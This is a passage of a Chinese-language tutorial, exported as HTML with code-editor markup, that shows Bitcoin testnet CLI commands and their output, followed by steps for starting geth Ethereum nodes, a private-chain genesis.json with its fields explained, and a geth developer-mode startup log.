class="cm-number">5</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"blocktime"</span>: <span class="cm-number">1528857923</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"txid"</span>: <span class="cm-string">"7db5ac458ac204ceef8c23564f729ae1a3846e27815352d1d8e9275649ef5b9b"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"walletconflicts"</span>: [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"time"</span>: <span class="cm-number">1528857557</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"timereceived"</span>: <span class="cm-number">1528857557</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"bip125-replaceable"</span>: <span class="cm-string">"no"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">]</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 859px;"></div><div class="CodeMirror-gutters" style="display: none; height: 859px;"></div></div></div></pre><ul><li>获取对等节点连接信息</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$ </span>./bitcoin-cli.exe <span class="cm-attribute">-testnet</span> getpeerinfo</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"addr"</span> : <span class="cm-string">"88.196.208.18:18333"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"addrlocal"</span> : <span class="cm-string">"[2001:0:9d38:953c:347f:a0a9:8ea6:9fa3]:18333"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"services"</span> : <span class="cm-string">"0000000d"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"lastsend"</span> : <span class="cm-number">1529043904</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"lastrecv"</span> : <span class="cm-number">1529043889</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"bytessent"</span> : <span class="cm-number">72605</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"bytesrecv"</span> : <span class="cm-number">105714</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"conntime"</span> : <span class="cm-number">1529028404</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"pingtime"</span> : <span class="cm-number">0</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"version"</span> : <span class="cm-number">70015</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"subver"</span> : <span class="cm-string">"/Satoshi:0.15.1/"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"inbound"</span> : <span class="cm-atom">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"startingheight"</span> : <span class="cm-number">1325463</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"banscore"</span> : <span class="cm-number">10</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"syncnode"</span> : <span class="cm-atom">true</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"addr"</span> : <span class="cm-string">"46.101.233.205:18333"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"addrlocal"</span> : <span class="cm-string">"[2001:0:9d38:953c:347f:a0a9:8ea6:9fa3]:18333"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"services"</span> : <span class="cm-string">"0000040d"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"lastsend"</span> : <span class="cm-number">1529043904</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"lastrecv"</span> : <span class="cm-number">1529043898</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"bytessent"</span> : <span class="cm-number">71706</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"bytesrecv"</span> : <span class="cm-number">463017</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"conntime"</span> : <span class="cm-number">1529028422</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"pingtime"</span> : <span class="cm-number">0</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"version"</span> : <span class="cm-number">70015</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"subver"</span> : <span class="cm-string">"/Satoshi:0.16.0/"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"inbound"</span> : <span class="cm-atom">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"startingheight"</span> : <span class="cm-number">1325463</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"banscore"</span> : <span class="cm-number">10</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"syncnode"</span> : <span class="cm-atom">false</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">]</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 859px;"></div><div class="CodeMirror-gutters" style="display: none; height: 859px;"></div></div></div></pre><ul><li>获取最长区块链的区块数目</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$ </span>./bitcoin-cli.exe <span class="cm-attribute">-testnet</span> getblockcount</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">1325482</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 54px;"></div><div class="CodeMirror-gutters" style="display: none; height: 54px;"></div></div></div></pre><h3><a name='header-n116' class='md-header-anchor '></a>以太坊初步探索</h3><blockquote><p><strong>OS:</strong> Ubuntu 14.04.5 LTS</p><p><strong>geth: </strong>1.8.13-unstable</p><p><strong>solc:</strong> 0.4.24+commit.e67f0147.Linux.g++</p><p><strong>golang:</strong> 1.10.3</p></blockquote><h4><a name='header-n126' class='md-header-anchor '></a>启动 geth</h4><p><strong>开发者网络：</strong>./geth --datadir &quot;./data&quot; --dev console</p><p><strong>以太坊正式网络：</strong>./geth --syncmode &quot;fast&quot; --cache=512 --datadir &quot;./data&quot; console</p><p><strong>以太坊测试网络：</strong>./geth --syncmode &quot;fast&quot; --datadir=&quot;./testnet&quot; --testnet  --mine --minerthreads=2 --cache=1024 console</p><p><strong>以太坊私有网络：</strong></p><p>配置创世块配置文件 <code>genesis.json</code></p><blockquote><p>配置自己的创世块是为了区分公有链，同一个网络中，创世块必须是一样的，否则无法联通。</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="json" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre>x</pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre></div><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"config"</span>: {</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"chainId"</span>: <span class="cm-number">10</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"homesteadBlock"</span>: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"eip155Block"</span>: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"eip158Block"</span>: <span class="cm-number">0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"alloc"</span> &nbsp; &nbsp;  : {},</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"coinbase"</span> &nbsp; : <span class="cm-string">"0x0000000000000000000000000000000000000000"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"difficulty"</span> : <span class="cm-string">"0x02000000"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"extraData"</span>  : <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"gasLimit"</span> &nbsp; : <span class="cm-string">"0x2fefd8"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"nonce"</span> &nbsp; &nbsp;  : <span class="cm-string">"0x0000000000000042"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"mixhash"</span> &nbsp;  : <span class="cm-string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span>,</span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"parentHash"</span> : <span class="cm-string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span>,</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"timestamp"</span>  : <span class="cm-string">"0x00"</span></span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 399px;"></div><div class="CodeMirror-gutters" style="display: none; height: 399px;"></div></div></div></pre><figure><table><thead><tr><th>参数名称</th><th>参数描述</th></tr></thead><tbody><tr><td>mixhash</td><td>与 nonce 配合用于挖矿</td></tr><tr><td>nonce</td><td>nonce就是一个64 位随机数，用于挖矿</td></tr><tr><td>difficulty</td><td>设置当前区块的难度，如果难度过大，cpu 挖矿就很难，这里设置较小难度</td></tr><tr><td>alloc</td><td>用来预置账号以及账号的以太币数量，因为私有链挖矿比较容易，所以我们不需要预置有币的账号，需要的时候自己创建即可以。</td></tr><tr><td>coinbase</td><td>矿工的账号，随便填</td></tr><tr><td>timestamp</td><td>设置创世块的时间戳</td></tr><tr><td>parentHash</td><td>上一个区块的 hash 值，因为是创世块，所以这个值是 0</td></tr><tr><td>extraData</td><td>附加信息，随便填，可以填你的个性信息</td></tr><tr><td>gasLimit</td><td>该值设置对 gas 的消耗总量限制，用来限制区块能包含的交易信息总和，因为我们是私有链，所以填最大。</td></tr></tbody></table></figure><ol><li>初始化<span>	</span>./geth --datadir &quot;./data&quot;  init genesis.json console</li><li>启动<span>	</span>./geth --datadir &quot;./data&quot;  console</li></ol><blockquote><p><strong>备注：</strong>可以使用开发者模式进行入门学习</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre>x</pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root:bin<span class="cm-comment"># ./geth --datadir "./data" --dev console</span></span></pre></div><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:34.448] Maximum peer count &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">ETH</span><span class="cm-operator">=</span><span class="cm-number">25</span> <span class="cm-def">LES</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">total</span><span class="cm-operator">=</span><span class="cm-number">25</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.293] Using developer account &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-def">address</span><span class="cm-operator">=</span>0x04f14C835B74f79B7dEf175C4e481929f9800501</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.293] Starting peer-to-peer <span class="cm-builtin">node</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">instance</span><span class="cm-operator">=</span>Geth/v1.8.13-unstable-040dd5bd/linux-amd64/go1.10.3</span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.293] Allocated cache and file handles &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">database</span><span class="cm-operator">=</span>/root/go/src/github.com/ethereum/go-ethereum/build/bin/data/geth/chaindata <span class="cm-def">cache</span><span class="cm-operator">=</span><span class="cm-number">768</span> <span class="cm-def">handles</span><span class="cm-operator">=</span><span class="cm-number">512</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.326] Persisted trie from memory database &nbsp; &nbsp; &nbsp;<span class="cm-def">nodes</span><span class="cm-operator">=</span><span class="cm-number">11</span> <span class="cm-def">size</span><span class="cm-operator">=</span><span class="cm-number">1</span>.71kB <span class="cm-def">time</span><span class="cm-operator">=</span><span class="cm-number">30</span>.048µs <span class="cm-def">gcnodes</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">gcsize</span><span class="cm-operator">=</span><span class="cm-number">0</span>.00B <span class="cm-def">gctime</span><span class="cm-operator">=</span>0s <span class="cm-def">livenodes</span><span class="cm-operator">=</span><span class="cm-number">1</span> <span class="cm-def">livesize</span><span class="cm-operator">=</span><span class="cm-number">0</span>.00B</span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.326] Initialised chain configuration &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-def">config</span><span class="cm-operator">=</span><span class="cm-string">"{ChainID: 1337 Homestead: 0 DAO: &lt;nil&gt; DAOSupport: false EIP150: 0 EIP155: 0 EIP158: 0 Byzantium: 0 Constantinople: &lt;nil&gt; Engine: clique}"</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.326] Initialising Ethereum protocol &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">versions</span><span class="cm-operator">=</span><span class="cm-string">"[63 62]"</span> <span class="cm-def">network</span><span class="cm-operator">=</span><span class="cm-number">1337</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.327] Loaded most recent local header &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-def">number</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">hash</span><span class="cm-operator">=</span>8f3035…7124e0 <span class="cm-def">td</span><span class="cm-operator">=</span><span class="cm-number">1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.327] Loaded most recent local full block &nbsp; &nbsp; &nbsp;<span class="cm-def">number</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">hash</span><span class="cm-operator">=</span>8f3035…7124e0 <span class="cm-def">td</span><span class="cm-operator">=</span><span class="cm-number">1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.327] Loaded most recent local fast block &nbsp; &nbsp; &nbsp;<span class="cm-def">number</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">hash</span><span class="cm-operator">=</span>8f3035…7124e0 <span class="cm-def">td</span><span class="cm-operator">=</span><span class="cm-number">1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.327] Loaded local transaction journal &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">transactions</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">dropped</span><span class="cm-operator">=</span><span class="cm-number">0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.327] Regenerated local transaction journal &nbsp; &nbsp;<span class="cm-def">transactions</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">accounts</span><span class="cm-operator">=</span><span class="cm-number">0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.327] Starting P2P networking</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.328] started whisper v.6.0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.328] RLPx listener up &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">self</span><span class="cm-operator">=</span><span class="cm-string">"enode://ad026d00f9ae6a7c2fae54aec6fe1692818a372aeae28418a1a0d5787809637e2b74c24038c15b734ef25a1b128915fbd75ae74aacedc428163b37346d872245@[::]:35685?discport=0"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.329] IPC endpoint opened &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-def">url</span><span class="cm-operator">=</span>/root/go/src/github.com/ethereum/go-ethereum/build/bin/data/geth.ipc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.329] Transaction pool price threshold updated <span class="cm-def">price</span><span class="cm-operator">=</span><span class="cm-number">18000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.329] Etherbase automatically configured &nbsp; &nbsp; &nbsp; <span class="cm-def">address</span><span class="cm-operator">=</span>0x04f14C835B74f79B7dEf175C4e481929f9800501</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.329] Starting mining operation</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|09:49:35.329] Commit new mining work &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">number</span><span class="cm-operator">=</span><span class="cm-number">1</span> <span class="cm-def">txs</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">uncles</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">elapsed</span><span class="cm-operator">=</span><span class="cm-number">58</span>.163µs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">WARN [07-25|09:49:35.330] Block sealing failed &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">err</span><span class="cm-operator">=</span><span class="cm-string">"waiting for transactions"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Welcome to the Geth JavaScript console!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">instance: Geth/v1.8.13-unstable-040dd5bd/linux-amd64/go1.10.3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">coinbase: 0x04f14c835b74f79b7def175c4e481929f9800501</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">at block: <span class="cm-number">0</span> (Thu, <span class="cm-number">01</span> Jan <span class="cm-number">1970</span> <span class="cm-number">08</span>:00:00 CST)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> datadir: /root/go/src/github.com/ethereum/go-ethereum/build/bin/data</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> modules: admin:1.0 clique:1.0 